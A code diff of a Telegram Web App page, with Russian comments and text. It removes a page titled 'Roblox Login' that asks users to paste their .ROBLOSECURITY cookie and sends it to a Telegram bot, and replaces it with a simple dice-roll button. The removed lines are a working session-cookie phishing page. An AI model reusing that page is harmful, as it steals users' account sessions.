@@ -1,39 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #1c1c1c; color: white; }
-        .card { background: #2a2a2a; padding: 20px; border-radius: 15px; border: 1px solid #444; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; }
-        button { width: 90%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; }
-        #status { display: none; margin-top: 15px; color: #00ff00; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2>Roblox Login</h2>
-        <input type="text" id="cookieInput" placeholder="Вставь .ROBLOSECURITY">
-        <button onclick="submit()">Проверить и сохранить</button>
-        <div id="status">Данные переданы боту...</div>
-    </div>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // Расширяем на весь экран
 
-        function submit() {
-            const cookie = document.getElementById('cookieInput').value;
-            if (cookie.length < 50) return alert("Неверный формат куки!");
-            
-            // Отправляем данные боту
-            tg.sendData(cookie); 
-            
-            document.getElementById('status').style.display = 'block';
-            // Не закрываем сразу, чтобы пользователь увидел статус
-            setTimeout(() => { tg.close(); }, 1500);
-        }
-    </script>
-</body>
-</html>
+    function rollDice() {
+        // Логика броска кубика (от 1 до 6)
+        const result = Math.floor(Math.random() * 6) + 1;
+        
+        // Визуализируем результат (здесь может быть ваша анимация)
+        console.log("Выпало:", result);
+
+        // Отправляем данные боту в виде строки
+        tg.sendData(JSON.stringify({ dice_value: result }));
+        
+        // Закрываем Web App (опционально)
+        tg.close();
+    }
+</script>
+
+<button onclick="rollDice()">Бросить кубик</button>
